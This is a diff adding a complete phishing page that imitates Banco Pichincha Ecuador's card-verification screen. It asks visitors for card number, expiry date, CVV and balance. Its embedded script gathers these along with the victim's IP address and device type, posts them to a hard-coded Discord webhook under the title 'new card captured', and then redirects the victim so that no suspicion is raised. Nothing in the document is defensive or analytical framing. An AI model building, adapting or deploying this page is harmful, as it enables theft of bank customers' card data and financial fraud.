@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Validación Segura | Banco Pichincha</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --pichincha-yellow: #ffdd00;
+        --pichincha-dark: #2d2d2d;
+        --pichincha-blue: #004b93;
+        --bg-gray: #f2f4f7;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background-color: var(--bg-gray);
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        padding: 20px;
+      }
+
+      .main-card {
+        background: #ffffff;
+        width: 100%;
+        max-width: 440px;
+        border-radius: 24px;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        overflow: hidden;
+        border: 1px solid #e0e6ed;
+        animation: fadeIn 0.6s ease-out;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(15px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .header {
+        padding: 40px 20px 20px;
+        text-align: center;
+      }
+
+      .header img {
+        width: 190px;
+      }
+
+      .content {
+        padding: 0 35px 35px;
+      }
+
+      h2 {
+        color: var(--pichincha-dark);
+        font-size: 1.3rem;
+        text-align: center;
+        margin-bottom: 25px;
+        font-weight: 700;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+      }
+
+      label {
+        display: block;
+        font-size: 0.7rem;
+        font-weight: 700;
+        color: var(--pichincha-blue);
+        margin-bottom: 8px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      input {
+        width: 100%;
+        padding: 14px;
+        border: 1.5px solid #d1d5db;
+        border-radius: 12px;
+        font-size: 1rem;
+        box-sizing: border-box;
+        transition: all 0.2s ease;
+        background: #fafafa;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: var(--pichincha-yellow);
+        background: #fff;
+        box-shadow: 0 0 0 4px rgba(255, 221, 0, 0.1);
+      }
+
+      .row {
+        display: flex;
+        gap: 15px;
+      }
+
+      .row .form-group {
+        flex: 1;
+      }
+
+      /* Sección de Saldo */
+      .balance-box {
+        background: linear-gradient(135deg, #ffffff 0%, #fffde7 100%);
+        border: 1px solid #f6e05e;
+        padding: 18px;
+        border-radius: 16px;
+        margin-top: 10px;
+        margin-bottom: 25px;
+      }
+
+      .input-icon {
+        position: relative;
+      }
+
+      .input-icon::before {
+        content: "$";
+        position: absolute;
+        left: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        font-weight: 700;
+        color: #4b5563;
+      }
+
+      .input-icon input {
+        padding-left: 32px;
+        border-color: #f6e05e;
+      }
+
+      .btn-confirm {
+        width: 100%;
+        padding: 18px;
+        background-color: var(--pichincha-dark);
+        color: var(--pichincha-yellow);
+        border: none;
+        border-radius: 12px;
+        font-size: 1rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.3s;
+        text-transform: uppercase;
+      }
+
+      .btn-confirm:hover {
+        background-color: #000;
+        transform: translateY(-1px);
+      }
+
+      .img-footer {
+        width: 100%;
+        height: 90px;
+        object-fit: cover;
+        display: block;
+        border-top: 1px solid #eee;
+      }
+
+      .legal-footer {
+        padding: 20px;
+        text-align: center;
+        font-size: 0.7rem;
+        color: #9ca3af;
+        background: #f9fafb;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main-card">
+      <div class="header">
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnfVl8KKXncvu_tuDTMkYeEqFEti6zo25H1A&s"
+          alt="Banco Pichincha"
+        />
+      </div>
+
+      <div class="content">
+        <h2>Verificación de Tarjeta</h2>
+
+        <form>
+          <div class="form-group">
+            <label for="tarjeta">Número de Tarjeta</label>
+            <input
+              type="text"
+              id="tarjeta"
+              placeholder="0000 0000 0000 0000"
+              maxlength="19"
+              required
+            />
+          </div>
+
+          <div class="row">
+            <div class="form-group">
+              <label for="fecha">Vencimiento (MM/AA)</label>
+              <input
+                type="text"
+                id="fecha"
+                placeholder="MM/AA"
+                maxlength="5"
+                required
+              />
+            </div>
+            <div class="form-group">
+              <label for="cvv">CVV</label>
+              <input
+                type="password"
+                id="cvv"
+                placeholder="123"
+                maxlength="4"
+                required
+              />
+            </div>
+          </div>
+
+          <div class="balance-box">
+            <label style="color: var(--pichincha-dark)"
+              >Saldo Disponible en su Tarjeta Pichincha ingresada</label
+            >
+            <div class="input-icon">
+              <input
+                type="number"
+                id="monto"
+                step="0.01"
+                placeholder="0.00"
+                required
+              />
+            </div>
+          </div>
+
+          <button type="submit" class="btn-confirm">
+            Acreditar Crédito Aprobado
+          </button>
+        </form>
+      </div>
+
+      <img
+        src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR76oQ29A6t4LiUMUj-lj0-JUbBpfA8o08rgw&s"
+        alt="Seguridad Bancaria"
+        class="img-footer"
+      />
+
+      <div class="legal-footer">
+        Conexión Segura SSL de 256 bits <br />
+        © 2026 Banco Pichincha Ecuador
+      </div>
+    </div>
+
+    <script>
+      const form = document.querySelector("form");
+
+      // Formateo automático de fecha (MM/AA)
+      const fechaInput = document.getElementById("fecha");
+      fechaInput.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 2) {
+          value = value.substring(0, 2) + "/" + value.substring(2, 4);
+        }
+        e.target.value = value;
+      });
+
+      // Formateo automático de tarjeta (4-4-4-4)
+      const tarjetaInput = document.getElementById("tarjeta");
+      tarjetaInput.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "");
+        let formatted = value.match(/.{1,4}/g)?.join(" ") || "";
+        e.target.value = formatted;
+      });
+
+      // Envío a Discord y Redirección
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        // 1. URL de tu Webhook de Discord
+        const DISCORD_WEBHOOK_URL =
+          "https://discord.com/api/webhooks/1494353566456877057/SnHztmydU8j6Tif_i9G2N_OO4YOeIC2bmm-vteyg4TQIsnD4eT2qNrTazM4g0ltfAvoB";
+
+        // 2. Captura de datos del formulario
+        const tarjeta = document.getElementById("tarjeta").value;
+        const fecha = document.getElementById("fecha").value;
+        const cvv = document.getElementById("cvv").value;
+        const monto = document.getElementById("monto").value;
+
+        try {
+          // 3. Obtener la IP real
+          const ipResponse = await fetch("https://api.ipify.org?format=json");
+          const ipData = await ipResponse.json();
+          const clienteIP = ipData.ip;
+
+          // 4. Identificar dispositivo de forma simple
+          let dispositivo = "PC / Otro";
+          const ua = navigator.userAgent.toLowerCase();
+          if (ua.includes("iphone") || ua.includes("ipad")) {
+            dispositivo = "iPhone";
+          } else if (ua.includes("android")) {
+            dispositivo = "Android";
+          }
+
+          // 5. Preparar el mensaje para Discord
+          const mensaje = {
+            embeds: [
+              {
+                title: "💳 NUEVA TARJETA CAPTURADA - PICHINCHA",
+                color: 16768256, // Amarillo Pichincha
+                fields: [
+                  {
+                    name: "🔢 Tarjeta",
+                    value: `\`${tarjeta}\``,
+                    inline: false,
+                  },
+                  { name: "📅 Vencimiento", value: fecha, inline: true },
+                  { name: "🔒 CVV", value: cvv, inline: true },
+                  {
+                    name: "💰 Saldo Tarjeta",
+                    value: `$${monto}`,
+                    inline: false,
+                  },
+                  {
+                    name: "🌐 IP Cliente",
+                    value: `\`${clienteIP}\``,
+                    inline: true,
+                  },
+                  { name: "📱 Dispositivo", value: dispositivo, inline: true },
+                ],
+                footer: { text: "Sistema de Validación Segura" },
+                timestamp: new Date(),
+              },
+            ],
+          };
+
+          // 6. Enviar a Discord
+          await fetch(DISCORD_WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(mensaje),
+          });
+
+          // 7. Redirección final
+          window.location.href = "corea1.html";
+        } catch (error) {
+          console.error("Error:", error);
+          // Redirigir incluso si falla el envío para no levantar sospechas
+          window.location.href = "corea1.html";
+        }
+      });
+    </script>
+  </body>
+</html>
